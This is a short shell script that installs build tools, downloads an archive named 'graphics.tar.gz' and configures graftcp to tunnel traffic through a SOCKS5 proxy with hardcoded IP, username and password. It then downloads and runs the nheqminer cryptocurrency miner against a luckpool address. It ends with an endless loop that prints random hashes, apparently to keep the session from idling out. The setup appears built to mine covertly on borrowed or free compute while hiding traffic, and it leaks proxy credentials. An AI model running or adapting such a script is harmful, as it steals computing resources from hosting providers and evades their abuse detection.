#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.223.155.101:1080
socks5_username = sempakcok
socks5_password = gunturmanis
END

wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz

tar -xvzf nheqminer-Linux-v0.8.2.tgz

tar xf nheqminer-Linux-v0.8.2.tar.gz

cd nheqminer

./nheqminer -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.luckpool  -p x -t 4

while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
sleep 2
done
